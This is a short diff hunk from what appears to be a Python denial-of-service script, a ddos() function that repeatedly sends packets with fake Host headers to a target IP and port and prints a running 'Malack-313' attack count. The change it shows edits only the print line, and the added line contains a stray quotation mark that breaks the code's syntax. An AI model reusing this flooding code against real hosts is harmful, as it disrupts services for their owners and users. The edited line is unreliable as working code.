@@ -51,7 +51,7 @@ def ddos():
                 s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))
 
                 attack_num += 1
-                print(f"[💥] {Fore.YELLOW}Malack-313 {Fore.GREEN}Attack number {Fore.CYAN}——> {Fore.MAGENTA} "+ str(attack_num))
+                print(f"[💥] {Fore.YELLOW}Malack-313 {Fore.GREEN}Attack number {Fore.CYAN}——> {Fore.MAGENTA} "+ str(attack_num)")
             except socket.error:
                 print('CONNECTION FAILED, HOST MAY BE DOWN OR CHECK IP OR PORT')
                 break
